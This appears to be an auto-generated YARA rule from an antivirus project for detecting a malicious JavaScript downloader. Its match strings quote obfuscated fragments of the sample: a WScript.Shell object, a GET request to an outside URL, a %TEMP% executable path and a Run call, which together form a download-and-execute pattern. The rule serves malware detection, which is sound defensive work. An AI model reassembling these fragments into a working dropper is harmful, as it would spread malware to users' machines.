rule sig_20160328_012624cd4a0dd5c22df5447c3cae99c2 {
  meta:
    description = "datamaliciousorder - file 20160328_012624cd4a0dd5c22df5447c3cae99c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df04a168dcddebe91cef4bcdd28cfa83fbe2882f586146e2b645bd35d4797497"

  strings:
    $s1  = "function Sprmrxdi() {return Egeoxhbkt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Iq9fZBAJO.exe\";};" fullword ascii
    $s2  = "do {WScript[Lczehga](Ocwxjavm() * 11)} while (Yiowrz[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Wnmszsifma(Losxur, Lnbxunmr){return Losxur - Lnbxunmr;};" fullword ascii
    $s4  = "var Egeoxhbkt = function Sckmjbdm() {return WScript[Ggkwhqu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Yiowrz[Oelfynwx](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s6  = "function Jiwwe() {return ((Ughkoamgnr == true) && (Ughkoamgnr == Ifeewdmhc)) ? 1 : Lfdxzmh;};" fullword ascii
    $s7  = "function Jiwunzog(Ezibkqh){Egeoxhbkt[\"Run\"](Ezibkqh, Lfdxzmh, Lfdxzmh);};" fullword ascii
    $s8  = "function Krxgj(){return Ggkwhqu;};" fullword ascii
    $s9  = "function Ibjlkghv(){return Ttsew;};" fullword ascii
    $s10 = "Ifeewdmhc = true; " fullword ascii
    $s11 = "function Zvnsm(Fkryu) {var Ovhwkvvad = (1, 2, 3, 4, 5, Fkryu); return Ovhwkvvad;};" fullword ascii
    $s12 = "var Glhms = new this[\"Date\"]();" fullword ascii
    $s13 = "var Ughkoamgnr = false;" fullword ascii
    $s14 = "var Zyntqzlqyn = false;" fullword ascii
    $s15 = " while (Ncouixkaej){" fullword ascii
    $s16 = "var Ifeewdmhc = false;" fullword ascii
    $s17 = "function Ewlpvmij()" fullword ascii
    $s18 = "return Wnmszsifma(Ksgfnid, Vyjcde);" fullword ascii
    $s19 = "function Ocwxjavm(){return 22;};" fullword ascii
    $s20 = "Ughkoamgnr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}